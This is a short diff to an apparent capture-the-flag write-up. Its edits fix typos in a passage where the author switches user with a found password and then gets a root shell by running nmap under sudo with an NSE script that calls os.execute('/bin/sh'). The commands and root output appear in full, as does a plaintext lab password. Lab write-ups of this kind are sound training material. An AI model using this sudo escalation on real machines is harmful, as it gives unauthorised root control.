@@ -294,7 +294,7 @@ Hmmm Good wlahila Good, Now you can pwn this!
 Th1s_vite$$@1337
 
 ```  
-I used su to switch tothe user spipa7 using the password `Th1s_vite$$@1337`
+I used su to switch to the user spipa7 using the password `Th1s_vite$$@1337` (Didn't check ssh) 
 
 Let's check sudo 
 
@@ -326,11 +326,12 @@ $ echo 'os.execute("/bin/sh")' > $TF
 $ sudo nmap nmap --script=$TF
 Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-17 03:25 UTC
 NSE: Warning: Loading '/tmp/tmp.NBuwiCQl1b' -- the recommended file extension is '.nse'.
-# uid=0(root) gid=0(root) groups=0(root)
+# id
+uid=0(root) gid=0(root) groups=0(root)
 ```
 We got root!
 
-Now let's search for the flag insied /root
+Now let's search for the flag inside /root
 
 ```bash
 drwx------  6 root root 4096 Apr  6 12:27 .
